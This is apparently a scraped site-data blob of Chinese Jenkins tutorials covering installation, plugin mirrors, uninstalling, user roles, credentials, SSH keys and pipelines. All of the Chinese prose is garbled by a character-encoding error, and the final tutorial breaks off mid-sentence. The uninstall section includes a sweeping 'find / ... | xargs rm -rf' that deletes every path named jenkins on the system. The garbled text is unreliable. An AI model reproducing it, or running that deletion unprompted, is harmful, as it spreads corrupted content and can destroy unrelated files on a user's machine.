æå¼æµè§å¨è®¿é®\nhttp://192.168.66.101:7777\n\n> æ³¨æï¼æ¬æå¡å¨æé²ç«å¢å³é­äºï¼å¦æå¼å¯é²ç«å¢ï¼éè¦å¨é²ç«å¢æ·»å ç«¯å£\n\n5. è·åå¹¶è¾å¥ admin è´¦æ·å¯ç \n\ncat /var/lib/jenkins/secrets/initialadminpassword\n\n\n1\n\n\n6. æ·»å ä¸ä¸ªç®¡çåè´¦æ·ï¼å¹¶è¿å¥ jenkins åå°\n\n7. è·³è¿æä»¶å®è£\nå ä¸º jenkins æä»¶éè¦è¿æ¥é»è®¤å®ç½ä¸è½½ï¼éåº¦éå¸¸æ¢ï¼èä¸ç»è¿ä¼å¤±è´¥ï¼æä»¥æä»¬ææ¶åè·³è¿æä»¶å®è£\n\n\n\n\n\n\n\n\n\n\n\n\n# jenkins æä»¶ç®¡ç\n\njenkins æ¬èº«ä¸æä¾å¾å¤åè½ï¼æä»¬å¯ä»¥éè¿ä½¿ç¨æä»¶æ¥æ»¡è¶³æä»¬çä½¿ç¨ãä¾å¦ä» gitlab æåä»£ç ï¼ä½¿ç¨ maven æå»ºé¡¹ç®ç­åè½éè¦ä¾é æä»¶å®æãæ¥ä¸æ¥æ¼ç¤ºå¦ä½ä¸è½½æä»¶ã\n\n\n# ä¿®æ¹ jenkins æä»¶ä¸è½½å°å\n\njenkins å½å¤å®æ¹æä»¶å°åä¸è½½éåº¦éå¸¸æ¢ï¼æä»¥å¯ä»¥ä¿®æ¹ä¸ºå½åæä»¶å°åï¼jenkins->manage jenkins->manage pluginsï¼ç¹å» available\n\n\n\n\n\nsystemctl restart jenkins\n\n\n1\n\n\n\n\næ­¤æ¶æä»¬å¯ä»¥è¿å¥ /var/lib/jenkins/updatesï¼çå°æä¸ª default.jsonï¼è¿ä¸ªæä»¶éé¢æ¯æææä»¶çå°åï¼è¿éé¢çå°åç®åå¨æ¯å½å¤çå°åï¼å¯ä»¥ç¨ä»¥ä¸å½ä»¤è¿è¡æ¿æ¢å°å½åå°åã\n\nsed -i \'s/http:\\/\\/updates.jenkinsci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\' default.json && sed -i \'s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\' default.json\n\n\n1\n\n\næåï¼manage plugins ç¹å» advancedï¼æ update site æ¹ä¸ºå½åæä»¶ä¸è½½å°å\n\n> https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\n\n\n\n\n\néå¯ jenkins ï¼å¨è®¿é®è·¯å¾åé¢é®å¥ restart å³å¯ã\n\nhttp://192.168.81.102:7777/restart\n\n\n1\n\n\néå¯å¥½åï¼æä»¬è¿è¡å¯¹ jenkins è¿è¡æ±åã\n\n\n\n\n\n> jenkins çæ¬æ´æ°å¤ªå¿«ï¼åæ¬æ ¸å¿åºä¹ä¼æ´æ°ï¼å¤§å®¶å¯ä»¥æ¾å¿æ´æ°ï¼ä¸ç¨æï¼æå¤å°±æ¯èµ·ä¸æ¥éè£ã\n\n\n# jenkins å¸è½½\n\nååæ­¢ jenkins çè¿è¡\n\n# æ¹å¼ä¸\nsystemctl stop jenkins\n# æ¹å¼äº\nservice jenkins stop\n\n\n1\n2\n3\n4\n\n\næ¾å°ææè· jenkins ç¸å³çå\n\nrpm -qc jenkins\n\n\n1\n\n\nå¸è½½ç¸å³å\n\nrpm -e jenkins\n\n\n1\n\n\næ£æ¥æ¯å¦å¸è½½æå\n\nrpm -ql jenkins\n\n\n1\n\n\nå é¤åä¸æä»¶\n\nfind / -iname jenkins | xargs -n 1000 rm -rf\n\n\n1\n',charsets:{cjk:!0}},{title:"Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯",frontmatter:{title:"Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/502",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/502.Jenkins(%E4%B8%89)%20Jenkins%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%8F%8A%E5%87%AD%E8%AF%81.html",relativePath:"04.è¿ç»´/50.Jenkins/502.Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯.md",key:"v-4e70a85e",path:"/jenkins/502/",headers:[{level:2,title:"ç¨æ·ç®¡ç",slug:"ç¨æ·ç®¡ç",normalizedTitle:"ç¨æ·ç®¡ç",charIndex:2},{level:3,title:"å®è£Role-based Authorization Strategyæä»¶",slug:"å®è£role-based-authorization-strategyæä»¶",normalizedTitle:"å®è£ role-based authorization strategy æä»¶",charIndex:72},{level:3,title:"ä¿®æ¹å®å¨éç½®ç­ç¥",slug:"ä¿®æ¹å®å¨éç½®ç­ç¥",normalizedTitle:"ä¿®æ¹å®å¨éç½®ç­ç¥",charIndex:118},{level:3,title:"åéè§è²åç¨æ·",slug:"åéè§è²åç¨æ·",normalizedTitle:"åéè§è²åç¨æ·",charIndex:135},{level:3,title:"å»ºç«é¡¹ç®",slug:"å»ºç«é¡¹ç®",normalizedTitle:"å»ºç«é¡¹ç®",charIndex:696},{level:2,title:"Jenkinså­è¯ç®¡ç",slug:"jenkinså­è¯ç®¡ç",normalizedTitle:"jenkins å­è¯ç®¡ç",charIndex:713},{level:3,title:"å®è£Credentials Bindingæä»¶",slug:"å®è£credentials-bindingæä»¶",normalizedTitle:"å®è£ credentials binding æä»¶",charIndex:807},{level:3,title:"å®è£Gitæä»¶åGitå·¥å·",slug:"å®è£gitæä»¶ågitå·¥å·",normalizedTitle:"å®è£ git æä»¶å git å·¥å·",charIndex:1296},{level:3,title:"æ·»å å­è¯ï¼username & passwordï¼",slug:"æ·»å å­è¯-username-password",normalizedTitle:"æ·»å å­è¯ï¼username &amp; passwordï¼",charIndex:null},{level:3,title:"SSH å¯é¥ç±»å",slug:"ssh-å¯é¥ç±»å",normalizedTitle:"ssh å¯é¥ç±»å",charIndex:1680}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ç¨æ·ç®¡ç å®è£Role-based Authorization Strategyæä»¶ ä¿®æ¹å®å¨éç½®ç­ç¥ åéè§è²åç¨æ· å»ºç«é¡¹ç® Jenkinså­è¯ç®¡ç å®è£Credentials Bindingæä»¶ å®è£Gitæä»¶åGitå·¥å· æ·»å å­è¯ï¼username & passwordï¼ SSH å¯é¥ç±»å",content:'# ç¨æ·ç®¡ç\n\næä»¬å¯ä»¥å©ç¨ Role-based Authorization Strategy æä»¶æ¥ç®¡ç Jenkins ç¨æ·æé\n\n\n# å®è£ Role-based Authorization Strategy æä»¶\n\n\n\n\n# ä¿®æ¹å®å¨éç½®ç­ç¥\n\n\n\n\n\n\n# åéè§è²åç¨æ·\n\n\n\n\n\n\n\nGlobal rolesï¼å¨å±è§è²ï¼ï¼ç®¡çåç­é«çº§ç¨æ·å¯ä»¥åå»ºåºäºå¨å±çè§è²\nItem rolesï¼é¡¹ç®è§è²ï¼ï¼éå¯¹æä¸ªæèæäºé¡¹ç®çè§è²\nNode rolesï¼èç¹è§è²ï¼ï¼èç¹ç¸å³çæé\n\næä»¬æ·»å ä»¥ä¸ä¸ä¸ªè§è²ï¼\n\n * baseRoleï¼è¯¥è§è²ä¸ºå¨å±è§è²ãè¿ä¸ªè§è²éè¦ç»å® Overall ä¸é¢ç Read æéï¼æ¯ä¸ºäºç»ææç¨æ·ç»å®æåºæ¬ç Jenkins è®¿é®æéãæ³¨æï¼å¦æä¸ç»åç»­ç¨æ·ç»å®è¿ä¸ªè§è²ï¼ä¼æ¥éè¯¯ï¼ç¨æ·å ismissing the Overall/Read permission\n * role1ï¼è¯¥è§è²ä¸ºé¡¹ç®è§è²ãä½¿ç¨æ­£åè¡¨è¾¾å¼ç»å® "itcast.*"ï¼æææ¯åªè½æä½ itcast å¼å¤´çé¡¹ç®ã\n * role2ï¼è¯¥è§è²ä¹ä¸ºé¡¹ç®è§è²ãç»å® "itheima.*"ï¼æææ¯åªè½æä½ itheima å¼å¤´çé¡¹ç®ã\n\n\n\n\n\n\n\n\n\nå¨ç³»ç»ç®¡çé¡µé¢è¿å¥ Manage Users\n\n\n\n\n\nç»ç¨æ·åéè§è²\nç³»ç»ç®¡çé¡µé¢è¿å¥ Manage and Assign Rolesï¼ç¹å» Assign Roles\nç»å®è§åå¦ä¸ï¼\nroot1 ç¨æ·åå«ç»å® baseRole å role1 è§è²\nroot2 ç¨æ·åå«ç»å® baseRole å role2 è§è²\n\n\n\n\n\n\n# å»ºç«é¡¹ç®\n\n\n\n\n\n\n\n\n\n\n# Jenkins å­è¯ç®¡ç\n\nå­æ®å¯ä»¥ç¨æ¥å­å¨éè¦å¯æä¿æ¤çæ°æ®åºå¯ç ãGitlab å¯ç ä¿¡æ¯ãDocker ç§æä»åºå¯ç ç­ï¼ä»¥ä¾¿ Jenkins å¯ä»¥åè¿äºç¬¬ä¸æ¹çåºç¨è¿è¡äº¤äºã\n\n\n# å®è£ Credentials Binding æä»¶\n\nè¦å¨ Jenkins ä½¿ç¨å­è¯ç®¡çåè½ï¼éè¦å®è£ Credentials Binding æä»¶\n\n\n\n\n\n\n\n\n\n\n\n * Username with passwordï¼ç¨æ·ååå¯ç \n * SSH Username with private keyï¼ ä½¿ç¨ SSH ç¨æ·åå¯é¥\n * Secret fileï¼éè¦ä¿å¯çææ¬æä»¶ï¼ä½¿ç¨æ¶ Jenkins ä¼å°æä»¶å¤å¶å°ä¸ä¸ªä¸´æ¶ç®å½ä¸­ï¼åå°æä»¶è·¯å¾è®¾ç½®å°ä¸ä¸ªåéä¸­ï¼ç­æå»ºç»æåï¼æå¤å¶ç Secret file å°±ä¼è¢«å é¤ã\n * Secret textï¼éè¦ä¿å­çä¸ä¸ªå å¯çææ¬ä¸²ï¼å¦ééæºå¨äººæ Github ç api token\n * Certificateï¼éè¿ä¸ä¼ è¯ä¹¦æä»¶çæ¹å¼\n\nå¸¸ç¨çå­è¯ç±»åæï¼Username with passwordï¼ç¨æ·å¯ç ï¼å SSH Username with private keyï¼SSH å¯é¥ï¼ï¼æ¥ä¸æ¥ä»¥ä½¿ç¨ Git å·¥å·å° Gitlab æåé¡¹ç®æºç ä¸ºä¾ï¼æ¼ç¤º Jenkins çå¦ä½ç®¡ç Gitlab çå­è¯ã\n\n\n# å®è£ Git æä»¶å Git å·¥å·\n\nä¸ºäºè®© Jenkins æ¯æä» Gitlab æåæºç ï¼éè¦å®è£ Git æä»¶ä»¥åå¨ CentOS7 ä¸å®è£ Git å·¥å·ã\n\n\n\nå¨ centos ä¸å®è£ git å·¥å·\n\n# å®è£\nyum install git -y \n# å®è£åæ¥ççæ¬\ngit --version \n\n\n1\n2\n3\n4\n\n\n\n# æ·»å å­è¯ï¼username & passwordï¼\n\næä½ å¨ git ä¸çè´¦å·å¯ç å å¥å°å­è¯ä¸­ã\n\n\n\nåå°æä»¬å¨ jenkins çé¡¹ç®ä¸­ï¼æ¥éç½®è¿ä¸ªé¡¹ç®ã\n\n\n\n\n\nåºç¨ï¼ç¶åä¿å­ãä¿å­åæä»¬æå»ºè¿ä¸ªé¡¹ç®\n\n\n\n\n\næå»ºæååï¼å¯ä»¥çå° jenkins ä¼æé¡¹ç®å¨æå¡å¨ä¸­ç /var/lib/jenkins/workspace/test01 è·¯å¾æå»ºä¸ä¸ªé¡¹ç®ï¼éè¿è¿ç§æ¹å¼ä»£è¡¨æä»¬éç½® git çå­è¯æ¯æåçã\n\n\n# SSH å¯é¥ç±»å\n\nSSH åå¯ç»å½ç¤ºæå¾\n\n\n\n1. ä½¿ç¨ root ç¨æ·çæå¬é¥åç§é¥\n\nssh-keygen -t rsa\n\n\n1\n\n\nå¨ /root/.ssh/ ç®å½ä¿å­äºå¬é¥åä½¿ç¨\n\n\n\nid_rsaï¼ç§é¥æä»¶\nid_rsa.pubï¼å¬é¥æä»¶\n\n2. æçæçå¬é¥çåå®¹æ¾å¨ Gitlab ä¸­ï¼æçæ¯ Gitea\n\n\n\n3. å¨ Jenkins ä¸­æ·»å å­è¯ï¼éç½®ç§é¥\nå¨ Jenkins æ·»å ä¸ä¸ªæ°çå­è¯ï¼ç±»åä¸º "SSH Username with private key"ï¼æåæçæç§ææä»¶åå®¹å¤å¶è¿æ¥\n\n\n\nè¿ä¸ª rootï¼æ¯ä½ å¨ æå¡å¨ï¼root ç®å½ä¸çæçï¼æä»¥å¡«å rootï¼æåä¾ç¶æ¯å¨é¡¹ç®ä¸­éç½®ä¸ä¸ git å³å¯',normalizedContent:'# ç¨æ·ç®¡ç\n\næä»¬å¯ä»¥å©ç¨ role-based authorization strategy æä»¶æ¥ç®¡ç jenkins ç¨æ·æé\n\n\n# å®è£ role-based authorization strategy æä»¶\n\n\n\n\n# ä¿®æ¹å®å¨éç½®ç­ç¥\n\n\n\n\n\n\n# åéè§è²åç¨æ·\n\n\n\n\n\n\n\nglobal rolesï¼å¨å±è§è²ï¼ï¼ç®¡çåç­é«çº§ç¨æ·å¯ä»¥åå»ºåºäºå¨å±çè§è²\nitem rolesï¼é¡¹ç®è§è²ï¼ï¼éå¯¹æä¸ªæèæäºé¡¹ç®çè§è²\nnode rolesï¼èç¹è§è²ï¼ï¼èç¹ç¸å³çæé\n\næä»¬æ·»å ä»¥ä¸ä¸ä¸ªè§è²ï¼\n\n * baseroleï¼è¯¥è§è²ä¸ºå¨å±è§è²ãè¿ä¸ªè§è²éè¦ç»å® overall ä¸é¢ç read æéï¼æ¯ä¸ºäºç»ææç¨æ·ç»å®æåºæ¬ç jenkins è®¿é®æéãæ³¨æï¼å¦æä¸ç»åç»­ç¨æ·ç»å®è¿ä¸ªè§è²ï¼ä¼æ¥éè¯¯ï¼ç¨æ·å ismissing the overall/read permission\n * role1ï¼è¯¥è§è²ä¸ºé¡¹ç®è§è²ãä½¿ç¨æ­£åè¡¨è¾¾å¼ç»å® "itcast.*"ï¼æææ¯åªè½æä½ itcast å¼å¤´çé¡¹ç®ã\n * role2ï¼è¯¥è§è²ä¹ä¸ºé¡¹ç®è§è²ãç»å® "itheima.*"ï¼æææ¯åªè½æä½ itheima å¼å¤´çé¡¹ç®ã\n\n\n\n\n\n\n\n\n\nå¨ç³»ç»ç®¡çé¡µé¢è¿å¥ manage users\n\n\n\n\n\nç»ç¨æ·åéè§è²\nç³»ç»ç®¡çé¡µé¢è¿å¥ manage and assign rolesï¼ç¹å» assign roles\nç»å®è§åå¦ä¸ï¼\nroot1 ç¨æ·åå«ç»å® baserole å role1 è§è²\nroot2 ç¨æ·åå«ç»å® baserole å role2 è§è²\n\n\n\n\n\n\n# å»ºç«é¡¹ç®\n\n\n\n\n\n\n\n\n\n\n# jenkins å­è¯ç®¡ç\n\nå­æ®å¯ä»¥ç¨æ¥å­å¨éè¦å¯æä¿æ¤çæ°æ®åºå¯ç ãgitlab å¯ç ä¿¡æ¯ãdocker ç§æä»åºå¯ç ç­ï¼ä»¥ä¾¿ jenkins å¯ä»¥åè¿äºç¬¬ä¸æ¹çåºç¨è¿è¡äº¤äºã\n\n\n# å®è£ credentials binding æä»¶\n\nè¦å¨ jenkins ä½¿ç¨å­è¯ç®¡çåè½ï¼éè¦å®è£ credentials binding æä»¶\n\n\n\n\n\n\n\n\n\n\n\n * username with passwordï¼ç¨æ·ååå¯ç \n * ssh username with private keyï¼ ä½¿ç¨ ssh ç¨æ·åå¯é¥\n * secret fileï¼éè¦ä¿å¯çææ¬æä»¶ï¼ä½¿ç¨æ¶ jenkins ä¼å°æä»¶å¤å¶å°ä¸ä¸ªä¸´æ¶ç®å½ä¸­ï¼åå°æä»¶è·¯å¾è®¾ç½®å°ä¸ä¸ªåéä¸­ï¼ç­æå»ºç»æåï¼æå¤å¶ç secret file å°±ä¼è¢«å é¤ã\n * secret textï¼éè¦ä¿å­çä¸ä¸ªå å¯çææ¬ä¸²ï¼å¦ééæºå¨äººæ github ç api token\n * certificateï¼éè¿ä¸ä¼ è¯ä¹¦æä»¶çæ¹å¼\n\nå¸¸ç¨çå­è¯ç±»åæï¼username with passwordï¼ç¨æ·å¯ç ï¼å ssh username with private keyï¼ssh å¯é¥ï¼ï¼æ¥ä¸æ¥ä»¥ä½¿ç¨ git å·¥å·å° gitlab æåé¡¹ç®æºç ä¸ºä¾ï¼æ¼ç¤º jenkins çå¦ä½ç®¡ç gitlab çå­è¯ã\n\n\n# å®è£ git æä»¶å git å·¥å·\n\nä¸ºäºè®© jenkins æ¯æä» gitlab æåæºç ï¼éè¦å®è£ git æä»¶ä»¥åå¨ centos7 ä¸å®è£ git å·¥å·ã\n\n\n\nå¨ centos ä¸å®è£ git å·¥å·\n\n# å®è£\nyum install git -y \n# å®è£åæ¥ççæ¬\ngit --version \n\n\n1\n2\n3\n4\n\n\n\n# æ·»å å­è¯ï¼username & passwordï¼\n\næä½ å¨ git ä¸çè´¦å·å¯ç å å¥å°å­è¯ä¸­ã\n\n\n\nåå°æä»¬å¨ jenkins çé¡¹ç®ä¸­ï¼æ¥éç½®è¿ä¸ªé¡¹ç®ã\n\n\n\n\n\nåºç¨ï¼ç¶åä¿å­ãä¿å­åæä»¬æå»ºè¿ä¸ªé¡¹ç®\n\n\n\n\n\næå»ºæååï¼å¯ä»¥çå° jenkins ä¼æé¡¹ç®å¨æå¡å¨ä¸­ç /var/lib/jenkins/workspace/test01 è·¯å¾æå»ºä¸ä¸ªé¡¹ç®ï¼éè¿è¿ç§æ¹å¼ä»£è¡¨æä»¬éç½® git çå­è¯æ¯æåçã\n\n\n# ssh å¯é¥ç±»å\n\nssh åå¯ç»å½ç¤ºæå¾\n\n\n\n1. ä½¿ç¨ root ç¨æ·çæå¬é¥åç§é¥\n\nssh-keygen -t rsa\n\n\n1\n\n\nå¨ /root/.ssh/ ç®å½ä¿å­äºå¬é¥åä½¿ç¨\n\n\n\nid_rsaï¼ç§é¥æä»¶\nid_rsa.pubï¼å¬é¥æä»¶\n\n2. æçæçå¬é¥çåå®¹æ¾å¨ gitlab ä¸­ï¼æçæ¯ gitea\n\n\n\n3. å¨ jenkins ä¸­æ·»å å­è¯ï¼éç½®ç§é¥\nå¨ jenkins æ·»å ä¸ä¸ªæ°çå­è¯ï¼ç±»åä¸º "ssh username with private key"ï¼æåæçæç§ææä»¶åå®¹å¤å¶è¿æ¥\n\n\n\nè¿ä¸ª rootï¼æ¯ä½ å¨ æå¡å¨ï¼root ç®å½ä¸çæçï¼æä»¥å¡«å rootï¼æåä¾ç¶æ¯å¨é¡¹ç®ä¸­éç½®ä¸ä¸ git å³å¯',charsets:{cjk:!0}},{title:"Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®",frontmatter:{title:"Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/504",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/504.Jenkins(%E4%BA%94)%20Jenkins%E6%9E%84%E5%BB%BAMaven%E9%A1%B9%E7%9B%AE.html",relativePath:"04.è¿ç»´/50.Jenkins/504.Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®.md",key:"v-7d0dc8ff",path:"/jenkins/504/",headers:[{level:2,title:"èªç±é£æ ¼é¡¹ç®æå»º",slug:"èªç±é£æ ¼é¡¹ç®æå»º",normalizedTitle:"èªç±é£æ ¼é¡¹ç®æå»º",charIndex:269},{level:2,title:"maven é¡¹ç®",slug:"maven-é¡¹ç®",normalizedTitle:"maven é¡¹ç®",charIndex:585},{level:2,title:"Pipelineæµæ°´çº¿é¡¹ç®æå»º",slug:"pipelineæµæ°´çº¿é¡¹ç®æå»º",normalizedTitle:"pipeline æµæ°´çº¿é¡¹ç®æå»º",charIndex:647},{level:3,title:"Pipelineç®ä»",slug:"pipelineç®ä»",normalizedTitle:"pipeline ç®ä»",charIndex:668},{level:3,title:"å®è£Pipelineæä»¶",slug:"å®è£pipelineæä»¶",normalizedTitle:"å®è£ pipeline æä»¶",charIndex:1498},{level:3,title:"Scripted Pipelineèæ¬å¼-Pipeline",slug:"scripted-pipelineèæ¬å¼-pipeline",normalizedTitle:"scripted pipeline èæ¬å¼ - pipeline",charIndex:2265},{level:2,title:"ç¼è¯æåé¨ç½²",slug:"ç¼è¯æåé¨ç½²",normalizedTitle:"ç¼è¯æåé¨ç½²",charIndex:2844},{level:3,title:"æåä»£ç ",slug:"æåä»£ç ",normalizedTitle:"æåä»£ç ",charIndex:1766},{level:3,title:"ç¼è¯æå",slug:"ç¼è¯æå",normalizedTitle:"ç¼è¯æå",charIndex:323},{level:3,title:"è¿ç¨é¨ç½²",slug:"è¿ç¨é¨ç½²",normalizedTitle:"è¿ç¨é¨ç½²",charIndex:2942},{level:2,title:"æjenkinsçPipelineèæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼Pipeline Script from SCMï¼",slug:"æjenkinsçpipelineèæ¬æ¾å°é¡¹ç®ä¸­æ§è¡-pipeline-script-from-scm",normalizedTitle:"æ jenkins ç pipeline èæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼pipeline script from scmï¼",charIndex:3005}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"èªç±é£æ ¼é¡¹ç®æå»º maven é¡¹ç® Pipelineæµæ°´çº¿é¡¹ç®æå»º Pipelineç®ä» å®è£Pipelineæä»¶ Scripted Pipelineèæ¬å¼-Pipeline ç¼è¯æåé¨ç½² æåä»£ç  ç¼è¯æå è¿ç¨é¨ç½² æjenkinsçPipelineèæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼Pipeline Script from SCMï¼",content:"Jenkins ä¸­èªå¨æå»ºé¡¹ç®çç±»åæå¾å¤ï¼å¸¸ç¨çæä»¥ä¸ä¸ç§ï¼\n\n * èªç±é£æ ¼è½¯ä»¶é¡¹ç®ï¼FreeStyle Projectï¼å¯ä»¥æå»ºä¸åè¯­è¨çé¡¹ç®\n * Maven é¡¹ç®ï¼Maven Projectï¼ä¸é¨åå¯¹ java è¯­è¨é¡¹ç®\n * æµæ°´çº¿é¡¹ç®ï¼Pipeline Projectï¼çµæ´»åº¦é«ï¼ç¨ä»£ç ç¼å jenkins æå»ºè¿ç¨ï¼å¦ k8s\n\næ¯ç§ç±»åçæå»ºå¶å®é½å¯ä»¥å®æä¸æ ·çæå»ºè¿ç¨ä¸ç»æï¼åªæ¯å¨æä½æ¹å¼ãçµæ´»åº¦ç­æ¹é¢ææåºå«ï¼å¨å®éå¼åä¸­å¯ä»¥æ ¹æ®èªå·±çéæ±åä¹ æ¯æ¥éæ©ãï¼PSï¼ä¸ªäººæ¨èä½¿ç¨æµæ°´çº¿ç±»åï¼å ä¸ºçµæ´»åº¦éå¸¸é«ï¼\n\n\n# èªç±é£æ ¼é¡¹ç®æå»º\n\n1. åå»ºèªç±é£æ ¼é¡¹ç®\n\n\n\n\n\n2. éç½® git\n\n\n\n3. æå»º\n\n\n\n\n\n4. ç¼è¯æå\n\necho \"å¼å§ç¼è¯åæå\"\nmvn clean package\necho \"ç¼è¯åæåç»æ\"\n\n\n1\n2\n3\n\n\n\n\n\n\n\n\n5. é¨ç½²å°ç®æ æº\nå®è£ Deploy to container æä»¶ï¼è¿ç§æä»¶éååå¸ war è¿ç§ç±»åçé¡¹ç®ï¼å° tomcat ç­å®¹å¨ä¸å»ã\n\n\n\n\n\n\n\n\n\ntomcat å­è¯éè¦èªå·±ç¾åº¦å»éç½®ä»¥ä¸ï¼å½ä½ éç½®æååï¼å¯ä»¥è®¿é®å° tomcat ç IP:8080/manager/html é¡µé¢ï¼éç½®å®ååå° jenkinsï¼é¨ç½²è¿ç¨ tomcat çæ¶åéè¦è¿ä¸ªå­è¯ã\n\n\n# maven é¡¹ç®\n\n1. å®è£ Maven Integration æä»¶\n2. æå»º maven é¡¹ç®\n\n\n\n\n\n\n\n\n# Pipeline æµæ°´çº¿é¡¹ç®æå»º\n\n\n# Pipeline ç®ä»\n\nPipelineï¼ç®åæ¥è¯´ï¼å°±æ¯ä¸å¥è¿è¡å¨ Jenkins ä¸çå·¥ä½æµæ¡æ¶ï¼å°åæ¥ç¬ç«è¿è¡äºåä¸ªæèå¤ä¸ªèç¹çä»»å¡è¿æ¥èµ·æ¥ï¼å®ç°åä¸ªä»»å¡é¾ä»¥å®æçå¤ææµç¨ç¼æåå¯è§åçå·¥ä½ã\n\nä½¿ç¨ Pipeline æä»¥ä¸å¥½å¤ï¼\n\n * ä»£ç ï¼Pipeline ä»¥ä»£ç çå½¢å¼å®ç°ï¼éå¸¸è¢«æ£å¥æºä»£ç æ§å¶ï¼ä½¿å¢éè½å¤ç¼è¾ï¼å®¡æ¥åè¿­ä»£å¶ä¼ éæµç¨ã\n * æä¹ï¼æ è®ºæ¯è®¡ååçè¿æ¯è®¡åå¤çæå¡å¨éå¯ï¼Pipeline é½æ¯å¯æ¢å¤çã\n * å¯åæ­¢ï¼Pipeline å¯æ¥æ¶äº¤äºå¼è¾å¥ï¼ä»¥ç¡®å®æ¯å¦ç»§ç»­æ§è¡ Pipeline\n * å¤åè½ï¼Pipeline æ¯æç°å®ä¸çä¸­å¤æçæç»­äº¤ä»è¦æ±ãå®æ¯æ fork/joinãå¾ªç¯æ§è¡ï¼å¹¶è¡æ§è¡ä»»å¡çåè½ã\n * å¯æ©å±ï¼Pipeline æä»¶æ¯æå¶ DSL çèªå®ä¹æ©å± ï¼ä»¥åä¸å¶ä»æä»¶éæçå¤ä¸ªéé¡¹ã\n\nå¦ä½åå»º Jenkins Pipelineï¼\n\n * Pipeline èæ¬æ¯ç± Groovy è¯­è¨å®ç°çï¼ä½æ¯æä»¬æ²¡å¿è¦åç¬å»å­¦ä¹  Groovy\n * Pipeline æ¯æä¸¤ç§è¯­æ³ï¼Declarative (å£°æå¼) å Scripted Pipeline (èæ¬å¼) è¯­æ³ï¼Scripted Pipeline æ¯ææ´å¤ç groovy è¯­è¨ï¼ä¸ååèåé£ä¹å¤çç»æåéå¶ãç±äºå¯ä»¥ç¼åçµæ´»çé»è¾ï¼å¯ä»¥è®¤ä¸ºæ¯é«çº§çç pipelineï¼å¦æä½ æ³å®ç°çé»è¾æ¯è¾çµæ´»ï¼æ¯å¦æå¤æ­ãåæ¯ï¼æèéè¦ç¨ groovy è¯­è¨ç¼åå¤æçè¿è¡æ­¥éª¤ï¼é½åºè¯¥éæ©ä½¿ç¨ Scripted Pipelineã\n * Pipeline ä¹æä¸¤ç§åå»ºæ¹æ³ï¼å¯ä»¥ç´æ¥å¨ Jenkins ç Web UI çé¢ä¸­è¾å¥èæ¬ï¼ä¹å¯ä»¥éè¿åå»ºä¸ä¸ª Jenkinsfile èæ¬æä»¶æ¾å¥é¡¹ç®æºç åºä¸­ï¼ä¸è¬æä»¬é½æ¨èå¨ Jenkins ä¸­ç´æ¥ä»æºä»£ç æ§å¶ (SCM) ä¸­ç´æ¥è½½å¥ Jenkinsfile Pipeline è¿ç§æ¹æ³ï¼ã\n\n\n# å®è£ Pipeline æä»¶\n\n\n\n> å®è£å®æ¯è®°å¾éå¯\n\nå®è£æä»¶æå¾å¤ä¾èµæä»¶ä¼å®è£å¤±è´¥ï¼ä¸ç¨ç®¡ï¼åªè¦åå»ºé¡¹ç®çæ¶åå¤äº âæµæ°´çº¿â ç±»åå³å¯ã\n\n\n\nä½ ä¼å¨é¡¹ç®çéç½®ä¸­çå°å¤äºä¸ä¸ªæµæ°´çº¿ï¼å®å°±æ¯åä»£äºä»¥ä¸é¡¹ç®çæå»ºåæå»ºåçä¸äºå·¥ä½ã\n\n\n\nä»¥ä¸æ¯åºäºä¸ä¸ªå£°æå¼ **ï¼Declarativeï¼ç Pipeline**ï¼ä»¥ pipeline å¼å¤´çå°±æ¯å£°æå¼çã\nstagesï¼ä»£è¡¨æ´ä¸ªæµæ°´çº¿çæææ§è¡é¶æ®µãéå¸¸ stages åªæ 1 ä¸ªï¼éé¢åå«å¤ä¸ª stage\nstageï¼ä»£è¡¨æµæ°´çº¿ä¸­çæä¸ªé¶æ®µï¼å¯è½åºç° n ä¸ªãä¸è¬åä¸ºæåä»£ç ï¼ç¼è¯æå»ºï¼é¨ç½²ç­é¶æ®µã\nstepsï¼ä»£è¡¨ä¸ä¸ªé¶æ®µåéè¦æ§è¡çé»è¾ (æ­¥éª¤)ãsteps éé¢æ¯ shell èæ¬ï¼git æåä»£ç ï¼ssh è¿ç¨åå¸ç­ä»»æåå®¹ã\næ¨¡æä¸æ®µï¼ç¶åæ§è¡ççææ\n\npipeline {\n    agent any\n\n    stages {\n        stage('æåä»£ç ') {\n            steps {\n                echo 'æåä»£ç '\n            }\n        }\n        stage('ç¼è¯æå»º') {\n            steps {\n                echo 'ç¼è¯æå»º'\n            }\n        }\n        stage('é¡¹ç®é¨ç½²') {\n            steps {\n                echo 'é¡¹ç®é¨ç½²'\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n\n\n# Scripted Pipeline èæ¬å¼ - Pipeline\n\n\n\n * Nodeï¼èç¹ï¼ä¸ä¸ª Node å°±æ¯ä¸ä¸ª Jenkins èç¹ï¼Master æè Agentï¼æ¯æ§è¡ Step çå·ä½è¿è¡ç¯å¢ï¼åç»­è®²å° Jenkins ç Master-Slave æ¶æçæ¶åç¨å°ã\n * Stageï¼é¶æ®µï¼ä¸ä¸ª Pipeline å¯ä»¥ååä¸ºè¥å¹²ä¸ª Stageï¼æ¯ä¸ª Stage 